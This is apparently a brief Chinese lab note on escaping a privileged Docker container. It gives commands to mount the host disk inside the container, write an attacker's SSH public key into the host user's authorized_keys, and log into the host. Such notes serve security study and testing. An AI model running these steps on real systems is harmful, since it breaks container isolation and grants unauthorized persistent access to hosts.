Docker特权逃逸

```
docket特权逃逸：

特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。

使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。

当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限
```



```
靶机：
mkdir /gz  #在docker中新建一个/gz目录用来挂载文件
mount /dev/sda1 /gz  #将 /dev/sda1 挂载到/gz目录里
#查看是否挂载上
cd /gz
ls


中间机
ssh-keygen -f gz #不设置密码，默认路径
ls
chmod 600 gz
cat gz.pub

靶机：
echo 'gz.pub文件内容' > /gz/home/ubuntu/.ssh/authorized_keys
ssh -i gz ubuntu@192.168.52.20

中间机：
sudo ssh
```



